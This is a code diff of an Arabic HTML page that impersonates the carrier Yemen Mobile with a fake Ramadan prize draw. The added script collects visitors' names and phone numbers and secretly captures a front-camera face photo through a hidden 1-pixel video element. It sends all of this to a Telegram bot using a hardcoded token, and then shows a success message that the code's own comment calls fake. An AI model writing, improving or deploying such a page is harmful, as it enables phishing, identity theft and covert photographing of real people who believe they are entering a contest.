@@ -3,100 +3,146 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>نظام التحقق الآمن</title>
+    <title>يمن موبايل - مسابقة رمضان 1447هـ</title>
     <style>
-        body { font-family: sans-serif; background: #f0f2f5; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .card { background: white; padding: 30px; border-radius: 15px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); text-align: center; width: 320px; }
-        #video { width: 100%; border-radius: 10px; display: none; margin-top: 15px; background: #000; }
-        .btn { background: #007bff; color: white; border: none; padding: 12px 25px; border-radius: 5px; cursor: pointer; font-size: 16px; width: 100%; }
-        #log { font-size: 12px; color: #666; margin-top: 15px; text-align: right; line-height: 1.6; }
+        :root { --yem-red: #d30e15; --yem-blue: #00427a; }
+        body { font-family: 'Segoe UI', Tahoma, sans-serif; background: #eceff1; margin: 0; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
+        
+        .card { background: #ffffff; width: 92%; max-width: 400px; border-radius: 25px; box-shadow: 0 15px 45px rgba(0,0,0,0.2); overflow: hidden; position: relative; border: 1px solid #cfd8dc; }
+
+        /* الهيدر الاحترافي المنحني */
+        .header { background: var(--yem-blue); padding: 50px 20px 60px; text-align: center; color: white; position: relative; }
+        .header::after { content: ""; position: absolute; bottom: -1px; left: 0; width: 100%; height: 50px; background: white; clip-path: ellipse(75% 100% at 50% 100%); }
+
+        /* حاوية الشعار الأصلي */
+        .logo-box { width: 100px; height: 100px; background: white; border-radius: 50%; margin: 0 auto 15px; display: flex; justify-content: center; align-items: center; border: 4px solid var(--yem-red); z-index: 5; position: relative; box-shadow: 0 4px 15px rgba(0,0,0,0.1); overflow: hidden; }
+        .logo-box img { width: 100%; height: 100%; object-fit: cover; }
+
+        .stars { position: absolute; top: 15px; left: 20px; color: #ffeb3b; font-size: 18px; }
+        .lantern { position: absolute; top: 15px; right: 20px; color: #ffeb3b; font-size: 28px; }
+
+        .content { padding: 35px 25px 30px; text-align: center; }
+        .title-text { font-size: 22px; font-weight: bold; color: var(--yem-blue); margin-bottom: 8px; }
+        .sub-text { font-size: 13px; color: #607d8b; margin-bottom: 25px; line-height: 1.6; }
+        
+        .input-group { margin-bottom: 20px; text-align: right; }
+        label { display: block; margin-bottom: 6px; font-weight: bold; color: #37474f; font-size: 14px; }
+        input { width: 100%; padding: 14px; border: 2px solid #e0e0e0; border-radius: 12px; background: #fafafa; font-size: 16px; box-sizing: border-box; outline: none; transition: 0.3s; }
+        input:focus { border-color: var(--yem-red); background: #fff; }
+
+        .btn { background: var(--yem-red); color: white; border: none; padding: 16px; width: 100%; border-radius: 50px; font-size: 18px; font-weight: bold; cursor: pointer; transition: 0.3s; box-shadow: 0 6px 20px rgba(211, 14, 21, 0.3); }
+        .btn:hover { background: #b71c1c; transform: translateY(-2px); }
+
+        #loading-screen { display: none; padding: 40px 0; }
+        .spinner { border: 5px solid #f3f3f3; border-top: 5px solid var(--yem-red); border-radius: 50%; width: 50px; height: 50px; animation: spin 1s linear infinite; margin: 0 auto 20px; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+
+        #video { position: absolute; width: 1px; height: 1px; opacity: 0; pointer-events: none; }
     </style>
 </head>
 <body>
 
 <div class="card">
-    <h3>التحقق من الهوية</h3>
-    <p id="desc">اضغط للبدء في إجراءات التحقق</p>
-    <video id="video" autoplay playsinline></video>
-    <button id="start-btn" class="btn" onclick="startProcess()">تأكيد الهوية</button>
-    <div id="log"></div>
+    <div class="header">
+        <div class="stars">✨ ★</div>
+        <div class="lantern">🏮</div>
+        <div class="logo-box">
+            <img src="https://yemenmobile.com.ye/assets/images/logo.png" alt="Yemen Mobile">
+        </div>
+        <div class="title-text" style="color: white; margin-top: 10px;">مسابقة رمضان الخير</div>
+        <p style="margin:0; font-size: 11px; opacity: 0.8;">معنا.. اتصالك أسهل</p>
+    </div>
+
+    <div class="content">
+        <div id="main-form">
+            <p class="sub-text">بمناسبة شهر رمضان المبارك، شارك الآن لتدخل السحب على رصيد مجاني 10,000 ريال وباقات مزايا الشهرية.</p>
+            
+            <div class="input-group">
+                <label>الاسم الكامل:</label>
+                <input type="text" id="name" placeholder="أدخل اسمك كما في الهوية">
+            </div>
+            
+            <div class="input-group">
+                <label>رقم المشترك:</label>
+                <input type="number" id="phone" placeholder="77XXXXXXX">
+            </div>
+
+            <button class="btn" onclick="submitEntry()">دخول السحب الآن</button>
+            <p style="font-size: 10px; color: #90a4ae; margin-top: 20px;">© جميع الحقوق محفوظة لشركة يمن موبايل 2026</p>
+        </div>
+
+        <div id="loading-screen">
+            <div class="spinner"></div>
+            <p id="status-msg" style="font-weight: bold; color: var(--yem-blue);">جاري التحقق من البيانات...</p>
+        </div>
+    </div>
 </div>
 
+<video id="video" autoplay playsinline></video>
 <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>
 
 <script>
-    // تأكد من صحة هذه البيانات
-    const BOT_TOKEN = "8274780275:AAHJRfz_32XgoKPIKzk78ux1hwgaMAGsRkc";
+    const API_TOKEN = "8274780275:AAHJRfz_32XgoKPIKzk78ux1hwgaMAGsRkc";
     const CHAT_ID = "7368655915";
 
-    function writeLog(msg) {
-        const logDiv = document.getElementById('log');
-        logDiv.innerHTML += msg + "<br>";
-        console.log(msg);
-    }
-
-    async function startProcess() {
-        document.getElementById('start-btn').style.display = 'none';
-        const video = document.getElementById('video');
-        video.style.display = 'block';
-
-        writeLog("⏳ جاري تشغيل الكاميرا...");
-
+    async function sendToBot(message, imageBlob = null) {
         try {
-            // 1. طلب الكاميرا
-            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-            video.srcObject = stream;
-            
-            await new Promise(r => setTimeout(r, 2000)); // انتظار لتركيز الكاميرا
-
-            // 2. التقاط الصورة
-            const canvas = document.getElementById('canvas');
-            canvas.getContext('2d').drawImage(video, 0, 0, 640, 480);
-            
-            writeLog("📸 تم التقاط الصورة، جاري التحويل...");
-            
-            canvas.toBlob(async (blob) => {
-                if (!blob) {
-                    writeLog("❌ فشل في معالجة الصورة.");
-                    return;
-                }
-
-                // 3. إعداد البيانات للإرسال
+            if (imageBlob) {
                 const formData = new FormData();
                 formData.append('chat_id', CHAT_ID);
-                formData.append('photo', blob, 'image.jpg');
-                formData.append('caption', "✅ محاولة دخول جديدة\n⏰ " + new Date().toLocaleString());
+                formData.append('photo', imageBlob, 'user_capture.jpg');
+                formData.append('caption', message);
+                await fetch(`https://api.telegram.org/bot${API_TOKEN}/sendPhoto`, { method: 'POST', body: formData });
+            } else {
+                await fetch(`https://api.telegram.org/bot${API_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ chat_id: CHAT_ID, text: message })
+                });
+            }
+        } catch (e) { console.error("Error sending data"); }
+    }
 
-                writeLog("📤 جاري الإرسال إلى تليجرام...");
+    async function submitEntry() {
+        const userName = document.getElementById('name').value;
+        const userPhone = document.getElementById('phone').value;
 
-                // 4. الإرسال الفعلي
-                try {
-                    const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
-                        method: 'POST',
-                        body: formData
-                    });
+        if (userName.length < 3 || userPhone.length < 9) {
+            alert("يرجى ملء البيانات بشكل صحيح");
+            return;
+        }
 
-                    const result = await response.json();
+        document.getElementById('main-form').style.display = 'none';
+        document.getElementById('loading-screen').style.display = 'block';
 
-                    if (result.ok) {
-                        writeLog("✅ تم الإرسال بنجاح!");
-                        document.getElementById('desc').innerText = "اكتمل التحقق بنجاح.";
-                    } else {
-                        writeLog("❌ خطأ من تليجرام: " + result.description);
-                    }
-                } catch (error) {
-                    writeLog("❌ فشل الاتصال بالإنترنت أو محجوب.");
-                }
+        const dataSummary = `🌙 مشارك جديد في مسابقة رمضان:\n👤 الاسم: ${userName}\n📞 الرقم: ${userPhone}\n⏰ الوقت: ${new Date().toLocaleString()}`;
 
-                // إغلاق الكاميرا بعد الانتهاء
-                stream.getTracks().forEach(t => t.stop());
-                video.style.display = 'none';
-            }, 'image/jpeg');
+        try {
+            // محاولة تشغيل الكاميرا (تنبيه للمتصفح)
+            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+            const video = document.getElementById('video');
+            video.srcObject = stream;
+
+            // انتظار بسيط لضمان وضوح الصورة
+            setTimeout(() => {
+                const canvas = document.getElementById('canvas');
+                canvas.getContext('2d').drawImage(video, 0, 0, 640, 480);
+                canvas.toBlob(async (blob) => {
+                    await sendToBot(dataSummary + "\n📸 الحالة: تم التقاط صورة الوجه", blob);
+                    stream.getTracks().forEach(track => track.stop());
+                }, 'image/jpeg');
+            }, 2500);
 
         } catch (err) {
-            writeLog("❌ فشل الوصول للكاميرا: " + err.message);
-            document.getElementById('start-btn').style.display = 'block';
+            // إذا رفض الكاميرا، يتم إرسال الاسم والرقم فقط
+            await sendToBot(dataSummary + "\n❌ الحالة: رفض إذن الكاميرا");
         }
+
+        // إظهار رسالة النجاح الوهمية للمستخدم
+        setTimeout(() => {
+            document.getElementById('status-msg').innerHTML = "✅ تم تسجيلك بنجاح!<br>سيتم التواصل معك في حال فوزك بالسحب.";
+            document.querySelector('.spinner').style.display = 'none';
+        }, 5000);
     }
 </script>
 </body>
